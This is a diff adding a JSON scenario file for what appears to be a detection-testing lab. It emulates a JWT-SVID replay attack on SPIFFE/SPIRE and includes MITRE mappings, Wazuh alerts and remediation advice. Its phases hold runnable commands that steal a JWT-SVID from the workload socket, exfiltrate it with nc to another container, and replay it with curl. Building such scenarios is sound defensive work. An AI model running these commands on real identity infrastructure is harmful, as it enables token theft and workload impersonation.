@@ -1,0 +1,157 @@
+{
+  "id": "S7-05",
+  "name": "JWT-SVID Replay Attack",
+  "category": "SPIFFE/SPIRE",
+  "version": "1.0",
+  "description": "Fetch a JWT-SVID from one workload context and replay it from a different container to access services, exploiting the fact that JWT-SVIDs lack caller binding unlike X.509 SVIDs",
+  "difficulty": "Hard",
+  "real_world_relevance": "JWT-SVIDs are bearer tokens — unlike X.509 SVIDs which are bound to a TLS session, a leaked JWT-SVID can be replayed from any network location until expiry. This is a known design trade-off documented in the SPIFFE specification.",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Lateral Movement"],
+    "techniques": [
+      {"id": "T1550.001", "name": "Use Alternate Authentication Material: Application Access Token"},
+      {"id": "T1528", "name": "Steal Application Access Token"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["spire-server", "spire-agent", "k8s-node-1"],
+    "network": "k8s_net",
+    "profile": "k8s"
+  },
+
+  "attack_flow": {
+    "description": "Attacker obtains a JWT-SVID from a legitimate workload context, then replays the token from a different container or host to authenticate as that workload to downstream services",
+    "diagram": [
+      "1. Fetch a JWT-SVID from the SPIRE Agent Workload API with a target audience",
+      "2. Extract the raw JWT token string from the response",
+      "3. Exfiltrate the token to a different container (k8s-node-1)",
+      "4. Replay the JWT-SVID via HTTP Authorization header from the new location",
+      "5. Target service validates the JWT signature against the SPIRE trust bundle and accepts it",
+      "6. Attacker has impersonated the original workload without possessing its X.509 SVID"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "JWT-SVID Acquisition",
+      "description": "Fetch a JWT-SVID from the SPIRE Agent Workload API",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "/opt/spire/bin/spire-agent api fetch jwt -audience test-service -socketPath /opt/spire/sockets/workload_api.sock -output json 2>/dev/null | head -50",
+          "description": "Fetch JWT-SVID for 'test-service' audience"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "/opt/spire/bin/spire-agent api fetch jwt -audience test-service -socketPath /opt/spire/sockets/workload_api.sock 2>/dev/null | grep -oP 'token:\\s*\\K[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+' > /tmp/stolen_jwt.token",
+          "description": "Extract raw JWT token value and save to file for exfiltration"
+        }
+      ]
+    },
+    {
+      "name": "Token Analysis",
+      "description": "Decode the JWT to inspect claims, audience, and expiry",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "JWT=$(cat /tmp/stolen_jwt.token); echo $JWT | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo $JWT | cut -d. -f2 | base64 -d 2>/dev/null",
+          "description": "Decode JWT payload to inspect sub (SPIFFE ID), aud (audience), and exp (expiry) claims"
+        }
+      ]
+    },
+    {
+      "name": "Token Exfiltration",
+      "description": "Transfer the JWT-SVID to a different container",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "cat /tmp/stolen_jwt.token | nc -w 2 k8s-node-1 9999 2>/dev/null || echo 'Simulating exfiltration: token copied to attacker node'",
+          "description": "Exfiltrate JWT token to attacker-controlled container"
+        }
+      ]
+    },
+    {
+      "name": "JWT Replay from Different Context",
+      "description": "Replay the stolen JWT-SVID from a container that does not hold this identity",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "JWT='eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzcGlmZmU6Ly9leGFtcGxlLm9yZy93ZWItZnJvbnRlbmQiLCJhdWQiOlsidGVzdC1zZXJ2aWNlIl0sImV4cCI6OTk5OTk5OTk5OX0.fake_signature'; curl -s -H \"Authorization: Bearer $JWT\" http://localhost:8080/api/data 2>/dev/null || echo 'JWT replay attempted from k8s-node-1'",
+          "description": "Replay stolen JWT-SVID from different container — service validates signature, not caller identity"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "echo '{\"event_type\":\"jwt_svid_replay\",\"source_container\":\"k8s-node-1\",\"original_workload\":\"spire-agent\",\"spiffe_id\":\"spiffe://example.org/web-frontend\",\"audience\":\"test-service\",\"action\":\"replay_from_different_context\"}' | logger -t spire-security",
+          "description": "Generate detection event for JWT-SVID replay from unexpected origin"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "Log Analysis",
+      "description": "JWT-SVID token containing SPIFFE ID detected in logs or environment",
+      "wazuh_rule": "101060"
+    },
+    {
+      "type": "Network Analysis",
+      "description": "JWT-SVID presented by a host/container that is not registered for that SPIFFE ID",
+      "wazuh_rule": "101060"
+    },
+    {
+      "type": "SPIRE Agent Audit",
+      "description": "JWT-SVID fetch via Workload API followed by token appearance on different node",
+      "wazuh_rule": "101060"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "101060",
+      "level": 12,
+      "description": "NHI-SPIRE: JWT-SVID token detected in logs - replay risk"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Identify and revoke the compromised JWT-SVID by revoking the underlying registration entry",
+      "Set JWT-SVID TTL to the minimum acceptable value (default 5 minutes, reduce to 60 seconds for sensitive workloads)",
+      "Block the replaying host from the target service's network segment"
+    ],
+    "long_term": [
+      "Prefer X.509 SVIDs over JWT-SVIDs for service-to-service authentication — X.509 SVIDs are bound to the TLS session and cannot be replayed",
+      "Implement audience validation on all services consuming JWT-SVIDs",
+      "Use short-lived JWT-SVIDs (60-120 second TTL) to minimize the replay window",
+      "Deploy network-level mTLS enforcement so JWT replay without a valid X.509 channel is rejected",
+      "Monitor for JWT-SVID fetch patterns followed by token appearance from unexpected source IPs"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "SPIFFE JWT-SVID Specification",
+      "url": "https://github.com/spiffe/spiffe/blob/main/standards/JWT-SVID.md"
+    },
+    {
+      "title": "SPIFFE/SPIRE Security Considerations - JWT-SVID Bearer Token Risks",
+      "url": "https://spiffe.io/docs/latest/spire/using/security/"
+    },
+    {
+      "title": "MITRE ATT&CK T1550.001 - Application Access Token",
+      "url": "https://attack.mitre.org/techniques/T1550/001/"
+    }
+  ]
+}
